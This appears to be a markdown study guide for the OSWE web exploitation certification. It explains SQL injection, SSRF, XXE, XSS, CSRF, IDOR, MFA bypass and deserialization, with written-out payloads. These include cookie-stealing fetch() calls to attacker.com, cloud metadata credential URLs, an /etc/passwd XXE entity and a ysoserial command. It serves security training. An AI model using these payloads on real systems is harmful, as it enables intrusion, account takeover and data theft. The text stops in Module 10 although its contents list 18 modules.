# OSWE — Offensive Security Web Expert
## Advanced Web Application Security & Exploitation

**Author:** DarcHacker  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Date:** 2026  
**Status:** Complete Web Security Exploitation Guide  

---

## Table of Contents

| Module | Topics | Key Skills |
|--------|--------|-----------|
| **00** | [Web App Fundamentals](#module-00-web-app-fundamentals) | HTTP, Cookies, Sessions, HTTPS |
| **01** | [Burp Suite Mastery](#module-01-burp-suite-mastery) | Proxy, Scanner, Intruder, Repeater |
| **02** | [SQL Injection Exploitation](#module-02-sql-injection-exploitation) | Extraction, Blind SQLi, Time-based |
| **03** | [Authentication Mechanisms](#module-03-authentication-mechanisms) | Bypass, Brute Force, Session Fixation |
| **04** | [Authorization & Access Control](#module-04-authorization--access-control) | IDOR, Privilege Escalation, ACL |
| **05** | [Business Logic Flaws](#module-05-business-logic-flaws) | Rate Limiting, State Manipulation |
| **06** | [Server-Side Request Forgery](#module-06-server-side-request-forgery) | SSRF, Cloud Metadata, Bypasses |
| **07** | [XML External Entity Injection](#module-07-xml-external-entity-injection) | XXE, Billion Laughs, DTD Abuse |
| **08** | [Cross-Site Scripting](#module-08-cross-site-scripting) | Reflected, Stored, DOM-based XSS |
| **09** | [Cross-Site Request Forgery](#module-09-cross-site-request-forgery) | CSRF, Token Bypass, SameSite |
| **10** | [Deserialization Attacks](#module-10-deserialization-attacks) | Java, PHP, Python Gadgets |
| **11** | [Server-Side Template Injection](#module-11-server-side-template-injection) | SSTI, Code Execution, Payloads |
| **12** | [NoSQL & Injection Variants](#module-12-nosql--injection-variants) | MongoDB, Injection, Bypasses |
| **13** | [API Security](#module-13-api-security) | REST/GraphQL, Authentication, IDOR |
| **14** | [OAuth & OpenID Connect](#module-14-oauth--openid-connect) | Flow Attacks, Token Theft, Bypasses |
| **15** | [WebSocket Security](#module-15-websocket-security) | Protocol, CSWSH, Exploitation |
| **16** | [Advanced Exploitation](#module-16-advanced-exploitation) | Chaining, Multi-stage, Complex scenarios |
| **17** | [Source Code Review](#module-17-source-code-review) | Vulnerability Identification, Analysis |
| **18** | [Exam Strategy](#module-18-exam-strategy) | Methodology, Time Management, Reporting |

---

## MODULE 00: Web App Fundamentals

### HTTP Protocol Deep Dive

**Foundation of web application security:**

```
HTTP REQUEST STRUCTURE:
┌─────────────────────────────────────────────────────────┐
│ METHOD PATH HTTP/VERSION                                 │
│ GET /api/users/123 HTTP/1.1                             │
│                                                          │
│ HOST: example.com                                        │
│ Content-Type: application/json                          │
│ Authorization: Bearer token123                          │
│ User-Agent: Mozilla/5.0...                              │
│ Cookie: SESSIONID=abc123; Role=admin                    │
│                                                          │
│ [Request Body]                                           │
│ {"action": "update", "id": 123}                          │
└─────────────────────────────────────────────────────────┘

HTTP RESPONSE STRUCTURE:
┌─────────────────────────────────────────────────────────┐
│ HTTP/1.1 200 OK                                          │
│                                                          │
│ Content-Type: application/json                          │
│ Content-Length: 256                                      │
│ Set-Cookie: SessionID=xyz789; HttpOnly; Secure          │
│ Cache-Control: no-cache, no-store                       │
│ X-Content-Type-Options: nosniff                         │
│                                                          │
│ {"status": "success", "data": {...}}                    │
└─────────────────────────────────────────────────────────┘
```

### Session Management

**Secure session handling principles:**

```
SESSION LIFECYCLE:
┌─────────────────────────────────────────────────────────┐
│ 1. USER LOGIN                                            │
│    POST /login                                           │
│    Credentials sent (HTTPS only)                         │
│                                                          │
│ 2. SESSION CREATED                                       │
│    Server generates: SessionID=<random_128bit_value>    │
│    Set-Cookie: SessionID=...; HttpOnly; Secure; SameSite│
│                                                          │
│ 3. AUTHENTICATION VERIFIED                               │
│    Server stores: SessionID → User Profile               │
│    Session expires: 30 minutes inactivity                │
│                                                          │
│ 4. AUTHORIZED REQUESTS                                   │
│    Client sends: Cookie: SessionID=...                  │
│    Server validates: SessionID exists & valid           │
│                                                          │
│ 5. LOGOUT                                                │
│    POST /logout                                          │
│    Server invalidates: SessionID deleted                 │
│    Set-Cookie: SessionID=; expires=past                 │
└─────────────────────────────────────────────────────────┘

SESSION STORAGE VULNERABILITY MATRIX:
├── localStorage     → XSS vulnerable (no HttpOnly)
├── sessionStorage   → XSS vulnerable (domain-scoped)
├── Cookies          → CSRF risk (but HttpOnly helps)
│   ├── Secure flag  → HTTPS only (prevents downgrade)
│   ├── HttpOnly     → No JS access (XSS protection)
│   └── SameSite     → CSRF protection (Strict/Lax)
└── Server-side      → Secure (but requires lookup)
```

### HTTPS & TLS Security

**Transport layer protection:**

```
TLS HANDSHAKE:
1. ClientHello      → Supported ciphers, TLS versions
2. ServerHello      → Chosen cipher, certificate
3. Certificate      → Server public key verification
4. Key Exchange     → Establish shared secret
5. ChangeCipherSpec → Encrypt all future data
6. Finished         → Authentication complete

COMMON MISCONFIGURATIONS:
├── Expired certificates
├── Self-signed certs without verification
├── Weak cipher suites (RC4, DES)
├── SSL/TLS version downgrade (SSLv3, TLSv1.0)
├── Certificate pinning bypass
└── Insecure renegotiation
```

---

## MODULE 01: Burp Suite Mastery

### Proxy Configuration

**Core tool for web security testing:**

```
BURP SUITE WORKFLOW:

1. CONFIGURE PROXY
   ├── Listener: 127.0.0.1:8080
   ├── Browser: FoxyProxy → 127.0.0.1:8080
   ├── Intercept: Turn ON
   └── Match & Replace: Setup patterns

2. CAPTURE & ANALYZE
   ├── Intercept requests
   ├── Examine parameters
   ├── Identify attack surface
   └── Note sensitive data flows

3. MODIFY & RESEND
   ├── Edit cookies/headers
   ├── Inject payloads
   ├── Test for vulnerabilities
   └── Observe application behavior

4. REPEATER & INTRUDER
   ├── Repeater: Manual testing
   ├── Intruder: Automated fuzzing
   ├── Sniper: Single parameter
   ├── Battering Ram: All parameters
   ├── Pitchfork: Multiple parameters
   └── Cluster Bomb: Parameter combinations
```

### Scanner Configuration

**Automated vulnerability detection:**

```
ACTIVE vs PASSIVE SCANNING:

PASSIVE SCANNING:
├── No requests sent
├── Analyzes captured traffic
├── Identifies: Insecure headers, cookies, content
├── Low false-positive rate
└── Safe for all environments

ACTIVE SCANNING:
├── Sends test payloads
├── May cause side effects (data deletion, etc.)
├── Identifies: SQLi, XSS, XXE, SSRF, etc.
├── High false-positive rate
└── Requires permission & staging environment

SCAN CONFIGURATION:
┌──────────────────────────────────────────────┐
│ Audit items: Active + Passive               │
│ Crawl depth: 2-3 levels (avoid infinite)   │
│ Exclude patterns: /logout, /api/admin       │
│ Insertion points: URL, body, headers        │
│ Grep/Match: Blind SQLi, timing signatures  │
└──────────────────────────────────────────────┘
```

### Intruder Mastery

**Fuzzing and parameter testing:**

```
ATTACK TYPES:

1. SNIPER (§)
   └── One parameter at a time
   └── Payload 1 → Param 1
   └── Payload 2 → Param 1
   └── Best for: Authentication bypass, enumeration

2. BATTERING RAM (§§)
   └── Same payload to all parameters
   └── Payload 1 → Param 1, 2, 3, ...
   └── Best for: Mass replacement, generic fuzzing

3. PITCHFORK (§ §)
   └── Multiple payloads to multiple parameters
   └── Payload Set 1 → Param 1
   └── Payload Set 2 → Param 2
   └── Best for: Credential testing, workflow attacks

4. CLUSTER BOMB (§ §)
   └── All payload combinations
   └── Payload 1 → Param 1 + Payload 1 → Param 2
   └── Exponential growth: 100 x 100 = 10,000 requests
   └── Best for: Complex parameter interactions

PAYLOAD SOURCES:
├── Simple list (manual wordlist)
├── Runtime file (load from disk)
├── Custom iterator (sequential numbers)
├── Character substitution (ROT13, etc.)
├── Case modification (upper, lower)
└── Recursive grep (extract from responses)
```

---

## MODULE 02: SQL Injection Exploitation

### SQL Injection Fundamentals

**Most critical web vulnerability:**

```
BASIC SQLi DETECTION:
┌─────────────────────────────────────────────────────────┐
│ URL: /products?id=1                                     │
│                                                          │
│ Backend Query: SELECT * FROM products WHERE id = [input]│
│                                                          │
│ TEST 1: /products?id=1'                                 │
│ Query: SELECT * FROM products WHERE id = 1'            │
│ Error: Unclosed quotation mark...                      │
│ Result: SQL INJECTION CONFIRMED                         │
│                                                          │
│ TEST 2: /products?id=1' OR '1'='1                       │
│ Query: SELECT * FROM products WHERE id = 1 OR 1=1     │
│ Result: All products returned (logic manipulation)      │
└─────────────────────────────────────────────────────────┘

CLASSIFICATION:
├── In-band (Error-based, Union-based)
│   ├── Error-based: Error messages reveal structure
│   └── Union-based: UNION SELECT to extract data
├── Blind (Boolean, Time-based)
│   ├── Boolean: True/false responses
│   └── Time-based: Sleep() delays
└── Out-of-band (DNS, HTTP callbacks)
    └── Data exfiltrated via DNS/HTTP queries
```

### Union-Based SQL Injection

**Most direct exploitation method:**

```
EXPLOITATION STEPS:

STEP 1: Determine column count
┌──────────────────────────────────────────────────────────┐
│ URL: /products?id=1 UNION SELECT NULL--                │
│ Response: Error (column mismatch)                       │
│                                                          │
│ URL: /products?id=1 UNION SELECT NULL,NULL--           │
│ Response: Error                                         │
│                                                          │
│ URL: /products?id=1 UNION SELECT NULL,NULL,NULL--      │
│ Response: Success! Column count = 3                     │
└──────────────────────────────────────────────────────────┘

STEP 2: Identify injectable columns
┌──────────────────────────────────────────────────────────┐
│ URL: /products?id=1 UNION SELECT 1,2,3--               │
│ Response: Column 2 displayed in page                    │
│ Inference: Use column 2 for data extraction             │
└──────────────────────────────────────────────────────────┘

STEP 3: Extract database information
┌──────────────────────────────────────────────────────────┐
│ Database name:                                           │
│ /products?id=1 UNION SELECT NULL,database(),NULL--     │
│                                                          │
│ Table enumeration:                                      │
│ /products?id=1 UNION SELECT NULL,table_name,NULL       │
│ FROM information_schema.tables                          │
│ WHERE table_schema=database()--                         │
│                                                          │
│ Column extraction:                                      │
│ /products?id=1 UNION SELECT NULL,column_name,NULL      │
│ FROM information_schema.columns                         │
│ WHERE table_name='users'--                              │
│                                                          │
│ Data extraction:                                        │
│ /products?id=1 UNION SELECT NULL,                       │
│ CONCAT(username,'::',password),NULL                     │
│ FROM users--                                            │
└──────────────────────────────────────────────────────────┘
```

### Blind SQL Injection

**When output is not directly visible:**

```
BOOLEAN-BASED BLIND SQLi:

EXPLOITATION:
┌──────────────────────────────────────────────────────────┐
│ URL: /login?username=admin&password=password             │
│                                                          │
│ BASELINE:                                               │
│ /login?username=admin&password=pass' OR '1'='1         │
│ Response: Login successful                              │
│                                                          │
│ TEST:                                                   │
│ /login?username=admin' AND '1'='1--&password=pass      │
│ Response: Login successful (condition TRUE)             │
│                                                          │
│ /login?username=admin' AND '1'='2--&password=pass      │
│ Response: Login failed (condition FALSE)                │
│                                                          │
│ EXTRACTION:                                             │
│ /login?username=admin' AND SUBSTRING(password,1,1)='P'--
│ If login succeeds → first char is 'P'                   │
│ If login fails → first char is not 'P'                  │
│                                                          │
│ Binary search through ASCII: 32-126 characters          │
│ Typically: 5-8 requests per character                   │
└──────────────────────────────────────────────────────────┘

TIME-BASED BLIND SQLi:

EXPLOITATION:
┌──────────────────────────────────────────────────────────┐
│ URL: /products?id=1                                      │
│                                                          │
│ BASELINE:                                               │
│ Response time: 200ms                                    │
│                                                          │
│ TEST (IF TRUE condition):                               │
│ /products?id=1' AND IF(1=1, SLEEP(5), 0)--             │
│ Response time: 5000ms+ (delayed)                        │
│                                                          │
│ TEST (IF FALSE condition):                              │
│ /products?id=1' AND IF(1=2, SLEEP(5), 0)--             │
│ Response time: 200ms (no delay)                         │
│                                                          │
│ EXTRACTION:                                             │
│ /products?id=1' AND IF(SUBSTRING(password,1,1)='P',    │
│ SLEEP(5), 0)--                                          │
│ If 5 second delay → first char is 'P'                   │
│ No delay → first char is not 'P'                        │
└──────────────────────────────────────────────────────────┘
```

### Automated SQLi with sqlmap

```
BASIC USAGE:
sqlmap -u "http://example.com/products?id=1" \
  --dbs                 # List databases
  --tables              # Enumerate tables
  --dump                # Extract all data
  -D database -T users  # Target specific table
  -C username,password  # Specific columns

ADVANCED OPTIONS:
--level 5             # Aggressive testing (slow)
--risk 3              # Maximum risk payloads
--technique BEUSTQ    # Test all techniques
  B: Boolean
  E: Error-based
  U: Union-based
  S: Stacked queries
  T: Time-based
  Q: Out-of-band

--tamper script       # Bypass filters (space2comment, etc.)
--string "success"    # Match true condition
--proxy http://proxy  # Route through Burp
--batch               # Automatic answers
```

---

## MODULE 03: Authentication Mechanisms

### Credential Brute Force

**Attacking weak authentication:**

```
PASSWORD SPRAY ATTACK:
┌─────────────────────────────────────────────────────────┐
│ ADVANTAGES:                                              │
│ ├── Avoids account lockout (1 password/user)           │
│ ├── Slower detection                                    │
│ └── Effective against weak password policies            │
│                                                          │
│ METHODOLOGY:                                             │
│ 1. Identify valid usernames (enumeration)               │
│ 2. Gather common passwords (LinkedIn, breaches, etc.)   │
│ 3. Try 1 password across all users                      │
│ 4. Wait 24 hours (avoid lockout)                        │
│ 5. Repeat with new password                             │
│                                                          │
│ EXAMPLE:                                                │
│ Users: admin, john, jane, bob                           │
│ Try: admin:password123, john:password123, ...           │
│ Wait 24 hours                                           │
│ Try: admin:letmein, john:letmein, ...                   │
└─────────────────────────────────────────────────────────┘

RATE LIMITING BYPASS:
├── IP rotation (proxy chains, VPN)
├── Distributed attacks (botnet-like)
├── Timing distribution (requests spread over time)
├── User-agent rotation
└── Referer/Origin header manipulation
```

### Session Fixation

**Forcing user into attacker-controlled session:**

```
ATTACK FLOW:
┌─────────────────────────────────────────────────────────┐
│ 1. ATTACKER: Get pre-session (without login)           │
│    GET /login                                           │
│    Response: Set-Cookie: SessionID=ATTACKER_SESSION    │
│                                                          │
│ 2. ATTACKER: Trick user to use this session            │
│    Send: <img src="http://victim.com/?sid=ATTACKER_SESSION">
│    Or: Modify HttpOnly=false to set via JS             │
│                                                          │
│ 3. USER: Login with attacker's session                 │
│    POST /login (with SessionID=ATTACKER_SESSION)       │
│    Server: Links ATTACKER_SESSION to user account      │
│                                                          │
│ 4. ATTACKER: Now authenticated as user                 │
│    Uses: SessionID=ATTACKER_SESSION                    │
│    Access: User's account, data, functions             │
└─────────────────────────────────────────────────────────┘

MITIGATION BYPASS:
├── Session regeneration evasion (time race)
├── Multiple session identifiers (exploit weak one)
└── Cookie handling flaws in application logic
```

### Multi-Factor Authentication Bypass

**Circumventing 2FA/MFA:**

```
BYPASS TECHNIQUES:

1. FLAWED LOGIC
   ├── Verification step skipped after first factor
   ├── Direct redirect to authenticated area
   └── No server-side state validation

2. BRUTE FORCE OTP
   ├── 4-digit OTP: 10,000 possibilities
   ├── No rate limiting: ~27 seconds to brute force
   ├── Time window: 30-60 seconds (generous window)
   └── Retry allowance: Multiple attempts per user

3. RACE CONDITIONS
   ├── Submit 2FA bypass while verification pending
   ├── Timing attack on authentication checks
   └── Parallel request handling (thread race)

4. RESPONSE MANIPULATION
   ├── Modify status code (401 → 200)
   ├── Edit response body (success=true)
   └── Intercept redirect (skip verification)

5. RECOVERY CODE ABUSE
   ├── Brute force recovery codes
   ├── Predictable generation algorithm
   └── No rate limiting on recovery attempts

6. BACKUP METHOD WEAKNESS
   ├── SMS interception
   ├── Email account compromise
   └── Alternate authentication method flaws
```

---

## MODULE 04: Authorization & Access Control

### Insecure Direct Object Reference (IDOR)

**Accessing resources beyond your authority:**

```
BASIC IDOR:
┌─────────────────────────────────────────────────────────┐
│ URL: /user/profile?id=1234                              │
│ Returns: {"name": "John", "email": "john@example.com"}  │
│                                                          │
│ EXPLOITATION:                                            │
│ /user/profile?id=1235 → Different user's profile        │
│ /user/profile?id=1236 → Another user's profile          │
│ /user/profile?id=1   → Admin user profile               │
│                                                          │
│ EXTRACTION:                                             │
│ 1. Identify parameter (id, user_id, pid)               │
│ 2. Test with own ID (verify functionality)             │
│ 3. Increment/decrement ID                               │
│ 4. Access other users' data                             │
└─────────────────────────────────────────────────────────┘

ADVANCED IDOR VARIATIONS:

UUID-based IDOR:
├── UUIDs appear random but predictable
├── Sequential generation
├── Leaked in client-side code/logs
└── Brute force (statistically possible)

Hash-based IDOR:
├── md5(username) = object identifier
├── Crack hash OR
├── Enumerate users to find hashes

Parameter Pollution:
├── /user?id=1234&user=5678 (process one, ignore other)
├── /user?id[]=1234&id[]=5678 (array handling)
└── Multiple parameters with similar names

Horizontal vs Vertical:
├── Horizontal: Same privilege level, different user
├── Vertical: Lower privilege accessing higher level resources
```

### Privilege Escalation

**Elevating access beyond assigned role:**

```
VERTICAL PRIVILEGE ESCALATION:

1. PARAMETER TAMPERING
   └── Change role parameter
   ├── /admin?role=user → /admin?role=admin
   ├── /api/user?privilege=0 → /api/user?privilege=1
   └── /profile?level=member → /profile?level=admin

2. COOKIE/JWT MODIFICATION
   └── Decode JWT (header.payload.signature)
   ├── Modify payload: {"role": "user"} → {"role": "admin"}
   ├── Re-sign with known secret (weak key)
   └── Or: Edit plaintext cookie if no signature

3. INSECURE DESERIALIZATION
   └── Object contains privilege information
   ├── Serialize malicious object
   ├── Inject via cookie/parameter
   └── Server deserializes (code execution possible)

4. BUSINESS LOGIC FLAWS
   └── Process reversal (complete checkout, then payment)
   ├── Price manipulation (edit price before purchase)
   ├── Concurrent requests (race condition)
   └── Application state confusion

EXAMPLE - ROLE ESCALATION:
┌─────────────────────────────────────────────────────────┐
│ 1. Normal flow:                                         │
│    POST /login → Authenticated as "user"               │
│    Access: /user/dashboard                             │
│                                                          │
│ 2. Intercept response:                                  │
│    HTTP/1.1 200 OK                                      │
│    Set-Cookie: role=user                               │
│                                                          │
│ 3. Modify cookie:                                       │
│    Set-Cookie: role=admin                              │
│                                                          │
│ 4. Access admin functions:                              │
│    GET /admin/settings → Success                        │
│    POST /admin/delete/user → Success                    │
└─────────────────────────────────────────────────────────┘
```

---

## MODULE 05: Business Logic Flaws

### Price Manipulation

**Exploiting e-commerce logic:**

```
ATTACK SCENARIOS:

1. PRICE PARAMETER EDITING
   ├── Item price in request: price=99.99
   ├── Modify: price=0.01
   ├── Complete purchase
   ├── Item bought for $0.01 instead of $99.99

2. CURRENCY CONVERSION ABUSE
   ├── Website supports multiple currencies
   ├── USD: $100
   ├── EUR: €50 (should be ~€92)
   ├── Application bug: Convert incorrectly
   ├── Pay €50 for $100 item

3. DISCOUNT CODE STACKING
   ├── Apply: SAVE20 (20% off)
   ├── Apply: SAVE30 (30% off)
   ├── No validation on multiple uses
   ├── Stack 5 codes: 100%+ discount = refund

4. COUPON DUPLICATION
   ├── Coupon code: ABC123
   ├── Use: POST /apply-coupon?code=ABC123
   ├── No validation on repeated use
   ├── Use 100 times = 100x discount applied

5. RACE CONDITION IN PRICING
   ├── Update price: $100 → $10
   ├── Old price cached in web tier
   ├── Purchase with cached price ($100)
   ├── Process payment with new price ($10)
   ├── Profit: $90 difference per transaction
```

### Business Logic Sequence Bypass

**Skipping required process steps:**

```
NORMAL WORKFLOW:
1. Select items
2. Add to cart
3. Review order
4. Enter shipping
5. Enter payment
6. Confirm purchase
7. Process payment
8. Order confirmed

BYPASS TECHNIQUES:

Direct Completion:
├── POST /order/complete (skip steps 2-7)
├── Navigate directly to final step
└── Submit required fields only

Step Reversal:
├── Complete checkout
├── Navigate back to payment
├── Cancel payment
├── Inventory already decremented
├── Your account shows "item purchased"

Concurrent Requests:
├── Maintain session across parallel requests
├── Submit conflicting cart modifications
├── Race condition in inventory check
├── Both users "own" same limited item

Parameter Injection:
├── Submit order with fake confirmation
├── Manually set order_status=completed
├── Inject order_id in response
└── Claim payment already processed
```

---

## MODULE 06: Server-Side Request Forgery

### SSRF Exploitation

**Making server perform unintended requests:**

```
BASIC SSRF:
┌─────────────────────────────────────────────────────────┐
│ Feature: Image proxy/CDN                                │
│ URL parameter: /image?url=http://cdn.example.com/pic    │
│                                                          │
│ VULNERABILITY:                                           │
│ /image?url=http://localhost/admin → Admin page fetched  │
│ /image?url=http://localhost:27017 → MongoDB port        │
│ /image?url=http://169.254.169.254/... → AWS metadata    │
│                                                          │
│ IMPACT:                                                 │
│ ├── Access internal services                            │
│ ├── Read files (file:// protocol)                       │
│ ├── Cloud metadata (AWS, GCP, Azure)                    │
│ ├── Internal API exploitation                           │
│ └── Port scanning (time-based inference)                │
└─────────────────────────────────────────────────────────┘

CLOUD METADATA EXTRACTION:

AWS EC2:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
Response:
{
  "AccessKeyId": "AKIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}

GCP Compute Engine:
GET http://metadata.google.internal/computeMetadata/v1/?recursive=true
Header: Metadata-Flavor: Google
Response: Full instance metadata including credentials

Azure:
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/
Response: OAuth2 token for Azure API access
```

### SSRF Filter Bypass

**Circumventing restrictions:**

```
BLACKLIST BYPASSES:

1. URL ENCODING
   ├── localhost → %6c%6f%63%61%6c%68%6f%73%74
   ├── Double encoding: %256c%256f%256360...
   └── Unicode encoding: \u006c\u006f\u0063...

2. ALTERNATIVE REPRESENTATIONS
   ├── 127.0.0.1 → 2130706433 (decimal IP)
   ├── 127.0.0.1 → 0x7f000001 (hex IP)
   ├── 127.0.0.1 → 127.1 (abbreviated)
   └── localhost → localhostlocal (mutation)

3. PROTOCOL VARIATION
   ├── http:// → HTTP:// (case sensitivity)
   ├── http://localhost → http;localhost (delimiter)
   ├── http://localhost@ → http://localhost@blocked (bypass)
   └── http://localhost#comment → fragment bypasses

4. DOMAIN TRICKS
   ├── Domain redirection (your-domain.com → 127.0.0.1)
   ├── Permissive regex: /^http.*localhost/ bypassed by
   │   http://localhost.attacker.com
   └── DNS rebinding (first lookup = good, second = 127.0.0.1)

5. OPEN REDIRECT CHAINING
   ├── Your site: /redirect?url=http://blocked.com
   ├── SSRF: /fetch?url=http://yoursite/redirect?url=http://blocked.com
   ├── Server sees "yoursite" (whitelisted)
   ├── Gets redirected to blocked.com
   └── Fetches sensitive data

DETECTION EVASION:
├── Timing attacks (doesn't trigger WAF)
├── Out-of-band exfiltration (DNS, HTTP callback)
└── Chaining with other vulnerabilities
```

---

## MODULE 07: XML External Entity Injection

### XXE Exploitation

**XML parsing vulnerabilities:**

```
BASIC XXE:
┌─────────────────────────────────────────────────────────┐
│ INPUT:                                                  │
│ <?xml version="1.0"?>                                   │
│ <!DOCTYPE foo [                                          │
│   <!ENTITY xxe SYSTEM "file:///etc/passwd">            │
│ ]>                                                       │
│ <data>&xxe;</data>                                       │
│                                                          │
│ PARSING:                                                │
│ Server processes DOCTYPE definition                     │
│ Defines entity "xxe" pointing to /etc/passwd            │
│ When &xxe; encountered, file contents loaded            │
│                                                          │
│ RESPONSE:                                               │
│ root:x:0:0:root:/root:/bin/bash                         │
│ daemon:x:1:1:daemon:...                                 │
│ [File contents disclosed]                               │
└─────────────────────────────────────────────────────────┘

XXE VARIATIONS:

1. EXTERNAL ENTITY
   └── ENTITY xxe SYSTEM "file:///etc/passwd"

2. PARAMETER ENTITY (DTD)
   ├── <!ENTITY % file SYSTEM "file:///etc/passwd">
   ├── <!ENTITY % eval "<!ENTITY &#x25; exfiltrate">
   └── Chaining for complex exploitation

3. BILLION LAUGHS (DENIAL OF SERVICE)
   ├── <!ENTITY lol "lol">
   ├── <!ENTITY lol2 "&lol;&lol;&lol;&lol;...">
   ├── <!ENTITY lol3 "&lol2;&lol2;&lol2;...">
   ├── Exponential expansion → server crash
   └── Also called "XML bomb"

4. OUT-OF-BAND DATA EXFILTRATION
   ├── No direct response with file contents
   ├── Use XXE to trigger HTTP/DNS requests
   ├── Embed file contents in request
   └── Attacker monitors incoming requests for data
```

### XXE in Different Contexts

```
XML-BASED FILE UPLOAD:
├── PDF metadata
├── Office documents (.docx, .xlsx use XML)
├── SVG images
├── SAML assertions
└── WebService messages

BLIND XXE (NO ERROR MESSAGES):
├── Detect via timing (SLEEP command)
├── Detect via external entity callback
├── Use oast.fun or similar for OOB callback
└── Monitor DNS/HTTP for exfiltration

WRAPPERS & PROTOCOLS:
├── file:// → Local file access
├── http:// → Internal HTTP requests
├── ftp:// → FTP server access
├── php:// → PHP filters (if available)
└── expect:// → Command execution (if available)
```

---

## MODULE 08: Cross-Site Scripting

### Reflected XSS

**Immediate execution in victim's browser:**

```
BASIC REFLECTED XSS:
┌─────────────────────────────────────────────────────────┐
│ URL: /search?q=<script>alert(1)</script>               │
│                                                          │
│ SERVER RESPONSE:                                        │
│ <html>                                                   │
│ <body>                                                   │
│ Search results for: <script>alert(1)</script>          │
│ </body>                                                 │
│ </html>                                                 │
│                                                          │
│ BROWSER EXECUTION:                                       │
│ 1. Receives HTML                                        │
│ 2. Encounters <script> tag                              │
│ 3. Executes JavaScript                                  │
│ 4. alert(1) pops up                                     │
│ 5. ATTACKER: Access victim's cookies, session, data    │
└─────────────────────────────────────────────────────────┘

EXPLOITATION:
1. Craft malicious link
2. Trick victim into clicking
3. Payload executes in victim's browser
4. Steal: document.cookie, localStorage, sessionStorage
5. Exfiltrate: User data, permissions, secrets

PAYLOAD EVOLUTION:
├── Simple: <script>alert(1)</script>
├── Event handler: <img src=x onerror=alert(1)>
├── SVG: <svg onload=alert(1)>
├── Style: <style>@import 'javascript:alert(1)';</style>
└── HTML5: <body onload=alert(1)>

DATA THEFT PAYLOAD:
├── Steal cookies: fetch('http://attacker.com?c='+document.cookie)
├── Steal localStorage: fetch('http://attacker.com?d='+JSON.stringify(localStorage))
├── Key logging: Monitor keyboard input, send to attacker
└── Form hijacking: Intercept form submissions, steal data
```

### Stored XSS

**Persistent attack affecting all users:**

```
STORED XSS FLOW:
┌─────────────────────────────────────────────────────────┐
│ 1. ATTACKER: Submit malicious comment                  │
│    POST /comment                                         │
│    comment = "<script>alert(1)</script>"               │
│    Server stores in database                            │
│                                                          │
│ 2. VICTIM: Browse comment section                      │
│    GET /comments                                         │
│    Server retrieves: "<script>alert(1)</script>"       │
│    Renders directly in HTML                             │
│                                                          │
│ 3. BROWSER: Executes stored script                     │
│    Victim's session compromised                         │
│    Attacker can now:                                    │
│    ├── Steal session cookie                             │
│    ├── Modify account settings                          │
│    ├── Perform actions as victim                        │
│    └── Propagate worm (modify comment → spread)        │
└─────────────────────────────────────────────────────────┘

COMMON INJECTION POINTS:
├── User profile fields (name, bio, website)
├── Comments, forum posts
├── Image alt text, captions
├── Message boards, chat
├── File uploads (filename, metadata)
└── Product reviews, ratings

WORM POTENTIAL:
├── Self-replicating XSS
├── Modify comment to include same payload
├── Each view creates new copies
├── Exponential growth (infects users viewing comments)
└── Can compromise entire user base
```

### DOM-Based XSS

**Vulnerability in client-side JavaScript:**

```
DOM XSS CHARACTERISTIC:
├── Never reaches server (bypasses server-side filters)
├── Source: User input (URL param, hash, postMessage)
├── Sink: Dangerous DOM manipulation (innerHTML, eval)
└── Flow: Input → JavaScript processing → DOM modification

VULNERABLE PATTERNS:

1. innerHTML (DANGEROUS)
   document.getElementById('search').innerHTML = 
     '<h3>Search results: ' + userInput + '</h3>';
   // If userInput = <img src=x onerror=alert(1)>
   // XSS executes in browser

2. eval() (EXTREMELY DANGEROUS)
   var data = eval('(' + userInput + ')');
   // Any input can execute arbitrary code

3. Function constructor
   var fn = new Function(userInput);
   fn(); // Executes user input as code

4. document.write
   document.write(userInput);
   // XSS if userInput contains HTML/JS

5. Indirect assignment
   var name = window.location.hash.slice(1);
   document.title = name;
   // If hash has HTML characters

SAFE ALTERNATIVES:
├── textContent instead of innerHTML
├── JSON.parse instead of eval
├── DOMPurify library for sanitization
├── Content Security Policy (CSP) headers
└── Object destructuring over eval
```

---

## MODULE 09: Cross-Site Request Forgery

### CSRF Mechanics

**Tricking authenticated users into unwanted actions:**

```
CSRF ATTACK FLOW:
┌─────────────────────────────────────────────────────────┐
│ 1. VICTIM: Logged into bank.com                         │
│    Cookie: auth=secure_session_token                   │
│    In browser: bank.com open in tab                    │
│                                                          │
│ 2. ATTACKER: Crafts malicious page                      │
│    attacker.com/steal-money.html:                       │
│    <form action="bank.com/transfer" method="POST">     │
│      <input name="to" value="attacker">               │
│      <input name="amount" value="10000">              │
│      <input type="submit">                            │
│    </form>                                              │
│    <script>document.forms[0].submit();</script>       │
│                                                          │
│ 3. VICTIM: Visits attacker.com                         │
│    Script auto-submits form                             │
│    Request: POST /transfer                             │
│    Cookie: auth=secure_session_token (auto-included)  │
│                                                          │
│ 4. BANK: Processes request                             │
│    Valid session cookie present                         │
│    Transfer $10,000 to attacker                        │
│    ✓ Transaction successful                            │
│                                                          │
│ 5. VICTIM: Unaware of transaction                      │
│    Account now $10,000 less                            │
└─────────────────────────────────────────────────────────┘

CSRF TOKEN BYPASS:

1. NO TOKEN
   ├── Application assumes cookie = authenticity
   └── CSRF succeeds

2. WEAK TOKEN
   ├── Token not validated
   ├── Token in GET parameter (logged)
   ├── Predictable token value
   └── Replaying old token succeeds

3. TOKEN VALIDATION FLAW
   ├── Accept any token value
   ├── Token not tied to user session
   ├── Multiple tokens allowed
   └── Attacker uses victim's token in response

4. SENSITIVE ACTION WITHOUT TOKEN
   ├── Profile change: has CSRF token
   ├── Delete account: no CSRF token
   └── Attacker targets unprotected action
```

---

## MODULE 10: Deserialization Attacks

### Java Deserialization RCE

**Exploiting unsafe object reconstruction:**

```
JAVA GADGET CHAINS:

Concept:
├── Serialized object = stream of bytes
├── Unsafe deserialization = automatic instantiation
├── Gadget chain = library functions leading to code execution
└── Payload = chained gadgets that execute command

Apache Commons Collections:
├── ChainedTransformer → chains multiple transformations
├── InvokerTransformer → invoke arbitrary methods
├── Runtime.getRuntime().exec() = code execution
└── Tool: ysoserial generates payloads

EXPLOITATION:
1. Identify Java serialization (java.io.ObjectInputStream)
2. Generate gadget chain payload
   ysoserial CommonsCollections5 'touch /tmp/pwned' | base64
3. Inject serialized payload
4. Server deserializes → gadget chain executes
5. Command executed on server

DETECTION:
├── "java.io.InvalidClassException"
├── "readObject() called"
└── Sudden network/file activity after deserialization

BLIND DESERIALIZATION RCE:
├── Use DNS callbacks (LDAP, HTTP)
